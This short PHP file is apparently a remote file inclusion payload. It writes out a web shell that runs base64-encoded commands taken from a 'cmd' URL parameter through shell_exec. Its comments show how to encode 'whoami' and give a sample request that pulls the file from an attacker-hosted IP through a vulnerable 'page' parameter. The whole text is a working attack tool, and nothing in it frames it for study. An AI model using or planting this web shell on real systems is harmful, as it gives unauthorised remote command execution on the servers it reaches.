<?php echo '<?php echo shell_exec(base64_decode($_GET["cmd"]));?>'
//run command: whoami
//encode with: echo 'whoami' | base64
//HTTP POST example:
//?page=http://192.168.1.4/RFI.php&cmd=d2hvYW1pCg==
 ?>